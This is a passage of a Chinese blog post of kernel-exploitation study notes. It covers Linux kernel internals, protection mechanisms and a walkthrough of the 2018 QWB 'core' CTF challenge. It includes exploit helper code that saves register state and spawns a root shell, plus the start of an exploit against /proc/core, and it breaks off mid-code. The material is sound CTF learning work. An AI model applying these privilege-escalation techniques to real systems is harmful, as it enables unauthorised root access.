@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    <meta name="description" content="Hexo Theme Redefine">
+    <meta name="author" content="hash_hash">
+    
+    <title>
+        
+            Kernel Pwn记录 |
+        
+        hash_hash&#39;s blog
+    </title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/brands.min.css">
+
+    
+<link rel="stylesheet" href="/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/css/regular.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/css2.css">
+
+    <script id="hexo-configurations">
+    let REDEFINE = window.REDEFINE || {};
+    REDEFINE.hexo_config = {"hostname":"hash-hash.github.io","root":"/","language":"en"};
+    REDEFINE.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#005080","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"center","right_side_width":"210px","content_max_width":"1000px","nav_color":{"left":"#f78736","right":"#367df7","transparency":35},"hover":{"shadow":true,"scale":false},"first_screen":{"enable":false,"background_image":{"light":"https://evan.beee.top/img/wallhaven-wqery6-light.webp","dark":"https://evan.beee.top/img/wallhaven-wqery6-dark.webp"},"title_color":{"light":"#fff","dark":"#d1d1b6"},"description":"Hash_Hash's blog"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":true},"code_block":{"copy":true,"style":"mac"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"0.4.4"};
+    REDEFINE.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+    
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                hash_hash&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/" >
+                                
+                                    
+                                        <i class="fa-regular fa-house"></i>
+                                    
+                                    HOME
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/archives" >
+                                
+                                    
+                                        <i class="fa-regular fa-archive"></i>
+                                    
+                                    ARCHIVES
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/categories" >
+                                
+                                    
+                                        <i class="fa-regular fa-bookmark"></i>
+                                    
+                                    CATEGORIES
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/about" >
+                                
+                                    
+                                        <i class="fa-regular fa-user"></i>
+                                    
+                                    ABOUT
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/links" >
+                                
+                                    
+                                        <i class="fa-regular fa-link"></i>
+                                    
+                                    FRIENDS
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/" >
+                         
+                            
+                                <i class="fa-regular fa-house"></i>
+                            
+                            HOME
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/archives" >
+                         
+                            
+                                <i class="fa-regular fa-archive"></i>
+                            
+                            ARCHIVES
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/categories" >
+                         
+                            
+                                <i class="fa-regular fa-bookmark"></i>
+                            
+                            CATEGORIES
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/about" >
+                         
+                            
+                                <i class="fa-regular fa-user"></i>
+                            
+                            ABOUT
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/links" >
+                         
+                            
+                                <i class="fa-regular fa-link"></i>
+                            
+                            FRIENDS
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+            <div class="article-title">
+                <span class="title-hover-animation"><h1 style="font-size:2rem; font-weight: bold; margin: 10px 0;">Kernel Pwn记录</h1></span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">hash_hash</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="pc">2023-01-15 17:13:08</span>
+        <span class="mobile">2023-01-15 17:13</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Pwn/">Pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/kernel/">kernel</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <p>尝试入门一下kernel，虽然说原来用户态的利用思路和内核态会有相似之处，但是刚入门需要补充挺多有关的知识，再加上我操作系统完全没学过，做得我属实懵逼，先记录一下基础内容，基本都是抄的a3师傅博客里的</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>OS</strong></p>
+<p>操作系统是抽象出的一个概念，实际上就是位于物理内存中的代码+数据，用于调度系统资源，控制IO设备，操作网络与文件系统。当CPU执行操作系统内核代码时通常运行在高权限环境，拥有完全的硬件访问能力，在执行用户态代码时通常运行在低权限环境，只拥有部分或缺失硬件访问能力。</p>
+<p><strong>分级保护域</strong></p>
+<p>简称Rings，是一种将计算机不同的资源划分至不同权限的模型。</p>
+<p>Ring0只给OS使用，Ring3所有程序均可使用，且内层Ring可以随意使用外层Ring的资源</p>
+<p>Intel的CPU将权限分为4个等级：Ring0~Ring3，权限等级依次降低.现代操作系统模型中通常使用Ring0和Ring3</p>
+<p>这种分级的模型是为了提高系统安全性，例如某软件作为在Ring3运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为其位于低权限的区域，直接申请调用会被拒绝</p>
+<p><strong>运行状态切换</strong></p>
+<p>程序运行过程当中会常发生用户态与内核态的切换</p>
+<p>当CPU收到外部中断时，会切换到Ring0，并根据中断描述符表索引相应的中断处理代码以执行</p>
+<p>当CPU运行特权级相关指令(iret,sysenter等)会发生运行状态改变</p>
+<p>usr → kernel</p>
+<p>通过<code>swapgs</code>切换GS寄存器，保存GS值。将当前栈顶记录在CPU独占区域，将该区域记录内核栈顶放入rsp。通过push保存各寄存器值。通过汇编指令判断是否为<code>x32_abi</code>。通过系统调用号执行相应系统调用</p>
+<p>kernel → usr</p>
+<p>通过<code>swapgs</code>恢复GS值，通过<code>sysretq/iretq</code>恢复用户控件继续执行</p>
+<p><strong>内核</strong></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://ctf-wiki.org/pwn/linux/kernel-mode/figure/Kernel_Layout.svg" alt="Kernel_Layout"></p>
+<p>kernel是一个操作系统最为核心的部分，提供着一个操作系统最为基础的功能，如</p>
+<ol>
+<li>控制并与硬件进行交互</li>
+<li>提供应用程序运行环境</li>
+<li>调度系统资源</li>
+</ol>
+<p>内核架构包括宏内核，微内核以及混合内核三种</p>
+<p>宏内核几乎将一切集成于内核，并向上层应用程序提供抽象API</p>
+<p>对于微内核，大部分系统服务都被剥离于内核之外，内核仅提供最为基本的功能如底层的寻址空间管理，线程管理，进程间通信等</p>
+<p><strong>LKM</strong></p>
+<p>即可加载内核模块，包括驱动程序和内核扩展模块，可以提供新的系统调用或其他服务，提高了内核的可拓展性和可维护性，linux下是ELF格式，可以被单独编译，不能单独运行。在运行时被链接到内核作为内核的一部分在内核空间运行</p>
+<p><strong>struct cred</strong></p>
+<p>内核通过维护cred结构体管理进程的权限，每个进程中都有一个cred结构，这个结构保存了该进程的权限等信息。</p>
+<p>常用的提权方式<code>cmmit_creds(prepare_kernel_cred(NULL))</code>就是利用了这一点</p>
+<p>下面是cred的源码</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC    0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD    0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>        uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>        gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>        suid;        <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>        sgid;        <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>        euid;        <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>        egid;        <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>        fsuid;        <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>        fsgid;        <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits;    <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;    <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;    <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;    <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>    *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>    *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>    *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>    *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>        *security;    <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>    <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>    <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="comment">/* RCU deletion */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> non_rcu;            <span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>    <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>
+<p><strong>内核内存管理</strong></p>
+<p>linux kernel主要有两内存管理器，<code>buddy system;slab allocator</code></p>
+<ul>
+<li>buddy system</li>
+</ul>
+<p>buddy system是linux kernel中一个较为底层的内存管理系统，以内存页为粒度管理所有物理内存。存在于区这一级别，对当前区所拥有的所有物理页框进行管理</p>
+<p>在buddy system中按照空闲页面的连续大小进行分阶管理，在每一个zone结构体中都有一个<code>free_area</code>结构体数组存储buddy system按照order管理的页面，如下图所示</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://picture-1311455354.cos.ap-shanghai.myqcloud.com/sOwdI5YMNUjLSib.png" alt></p>
+<ul>
+<li>slab allocator</li>
+</ul>
+<p>slab allocator是更加细粒度的内存管理器，通过向buddy system请求单张或多张连续内存页后再分割为同等大小的object返还给上层调用者实现更为细粒度的内存管理</p>
+<p>slab allocator共三个版本，其中slub是现在通用版本</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://picture-1311455354.cos.ap-shanghai.myqcloud.com/ivPnbsjHyI94m5z.png" alt></p>
+<p>将slab allocator向buddy system请求得来的内存页称为一个slub，其被分割为多个同等大小object。slub的第一张内存页对应page结构体上的freelist指向该内存页上的第一个空闲对象，一个slub上的所有空闲object组成以NULL结尾的单向链表。object有点类似于用户态的chunk</p>
+<p>分配过程：</p>
+<ol>
+<li>从<code>kmem_cache_cpu</code>上的slub取对象，有则直接返回</li>
+<li>若无空闲对象，对应slub加入到<code>kmem_cache_node</code>的full链表，并考虑从partial链表取slub挂载到<code>kmem_cache_cpu</code>上，再取空闲对象</li>
+<li>若partial链也为空，则向buddy system请求分配新内存页，划分为多个object再挂载到<code>kmem_cache_cpu</code>，取空闲对象返回</li>
+</ol>
+<p>释放过程：</p>
+<ol>
+<li>若被释放object属于<code>kmem_cache_cpu</code>的slub，直接头插法插入当前slub的freelist</li>
+<li>若属于partial链上的slub，添加到该slub的freelist</li>
+<li>若属于full链上的slub，设置为freelist的头节点，该slub从full链表迁移至partial链表</li>
+</ol>
+<h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><p><strong>KASLR</strong></p>
+<p>即内核空间地址随机化，和用户态程序的ASLR类似</p>
+<p><strong>FGKASLR</strong></p>
+<p>KASLR的改进，以函数粒度重新排布内核代码</p>
+<p><strong>STACK PROTECTOR</strong></p>
+<p>类似canary，用于检测是否发生内核堆栈溢出，也叫stack cookie</p>
+<p><strong>SMAP/SMEP</strong></p>
+<p>SMAP为管理模式访问保护，SMEP为管理模式执行保护，两模式开启以阻止内核空间直接访问或执行用户空间的数据，可防范ret2usr攻击</p>
+<p><strong>KPTI</strong></p>
+<p>内核页表隔离，内核空间与用户空间分别使用两组不同的页表集，对于开启了KPTI的内核而言，内核页表的用户地址空间无执行权限</p>
+<p><strong>kptr_restrict</strong></p>
+<p>允许查看内核函数地址</p>
+<p><strong>dmesg_restrict</strong></p>
+<p>允许查看<code>printk</code>函数输出，用<code>dmesg</code>命令来查看</p>
+<p><strong>MMAP_MIN_ADDR</strong></p>
+<p>不允许申请<code>NULL</code>地址 <code>mmap(0,....)</code></p>
+<ul>
+<li><p><code>KASLR;SMAP;SMEP</code>可以修改启动脚本来关闭</p>
+</li>
+<li><p><code>kptr_restrict</code>、<code>dmesg_restrict</code>可在<code>rcS</code>文件中修改</p>
+</li>
+</ul>
+<h2 id="Kernel-Rop"><a href="#Kernel-Rop" class="headerlink" title="Kernel Rop"></a>Kernel Rop</h2><p>和用户态类似同样是通过栈溢出漏洞劫持程序流，先提权再着陆回用户态执行<code>system(&quot;/bin/sh&quot;)</code>来getshell</p>
+<h3 id="2018QWB-core"><a href="#2018QWB-core" class="headerlink" title="[2018QWB]core"></a>[2018QWB]core</h3><p>一般kernel pwn的题目会给四个文件，bzimage, xxx.cpio, boot.sh, vmlinux</p>
+<p>其中bzimage是压缩后的内核，xxx.cpio是压缩的文件系统，boot.sh是启动脚本，vmlinux是静态编译的内核</p>
+<p>我们用ropper在vmlinux中寻找gadget</p>
+<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br></pre></td></tr></table></figure></div>
+<p>没给vmlinux的话可以用<a class="link" target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">脚本<i class="fa-solid fa-up-right-from-square"></i></a>自己提取</p>
+<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure></div>
+<p>查看启动文件</p>
+<p><code>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</code>说明开启了kaslr，为了方便调试改成<code>nokaslr</code></p>
+<p>下面是解压.cpio文件的命令</p>
+<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> xx</span><br><span class="line"><span class="built_in">cd</span> xx</span><br><span class="line"><span class="built_in">mv</span> ../xx.cpio xx.cpio.gz</span><br><span class="line">gunzip ./xx.cpio.gz</span><br><span class="line">cpio -idm &lt; ./xx.cpio</span><br></pre></td></tr></table></figure></div>
+<p>查看init文件，为一些初始化操作</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br></pre></td></tr></table></figure></div>
+<p><code>insmod /core.ko</code>表示加载core.ko这个内核模块</p>
+<p>同时文件里还有<code>gen_cpio.sh</code>，是一个方便打包的脚本</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; <span class="variable">$1</span></span><br></pre></td></tr></table></figure></div>
+<p>运行就可以了，会生成新的压缩文件系统</p>
+<p><strong>gdb调试</strong></p>
+<p><code>add-symbol-file ./core/core.ko 0xffffffffc0000000</code>加载符号表方便调试，地址是通过修改init用root权限读取.text</p>
+<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /sys/module/core/sections/.text </span><br></pre></td></tr></table></figure></div>
+<p><code>target remote localhost:1234</code>连接到本地端口</p>
+<p>照着wp打了一遍，kernel的调试比较麻烦，用n的话很容易跑飞只能一步步si</p>
+<p>下面抄一些经常用到的代码</p>
+<p>保存寄存器值，以及起一个root shell的函数</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="literal">NULL</span>, prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(getuid())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>查找<code>prepare_kernel_cred,commit_creds</code>地址</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> commit_creds = <span class="literal">NULL</span>, prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line">...</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">	saveStatus();</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	FILE* sym_table_fd = open(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(sym_table_fd &lt; <span 